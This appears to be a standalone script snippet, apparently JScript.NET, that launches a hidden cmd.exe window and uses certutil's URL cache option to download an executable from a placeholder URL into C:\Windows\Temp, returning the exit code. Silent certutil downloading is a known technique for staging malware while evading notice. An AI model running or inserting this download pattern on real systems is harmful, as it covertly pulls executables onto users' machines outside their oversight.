(function(url, path) {
    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c certutil -urlcache -split -f \"" + url + "\" \"" + path + "\"");
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;
    var p = System.Diagnostics.Process.Start(psi);
    p.WaitForExit();
    return "Downloaded to " + path + " (exit code: " + p.ExitCode + ")";
})("https://example.com/file.exe", "C:\\Windows\\Temp\\file.exe")
